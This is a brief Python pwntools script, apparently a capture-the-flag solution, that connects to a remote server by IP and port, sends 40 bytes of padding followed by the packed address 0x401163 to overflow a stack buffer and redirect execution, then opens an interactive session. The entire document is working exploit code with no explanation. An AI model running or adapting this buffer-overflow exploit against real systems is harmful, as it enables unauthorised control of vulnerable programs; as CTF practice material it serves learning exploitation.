from pwn import *


p = remote('193.57.159.27',33769)
flag = p64(0x401163)




payload = 'a'* 40
payload += flag

p.sendlineafter('access: ',payload)


p.interactive()
